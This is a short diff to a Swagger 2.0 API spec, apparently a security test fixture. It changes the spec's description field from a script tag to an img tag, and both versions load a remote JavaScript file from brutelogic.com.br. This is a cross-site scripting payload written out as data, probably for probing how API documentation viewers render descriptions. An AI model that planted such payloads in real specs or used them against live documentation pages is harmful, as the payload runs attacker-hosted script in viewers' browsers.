@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   version: "0.0.1"
   title: Example Title
-  description: <script src=//brutelogic.com.br/1.js>
+  description: <img src=//brutelogic.com.br/1.js>
 paths:
   /:
     get:
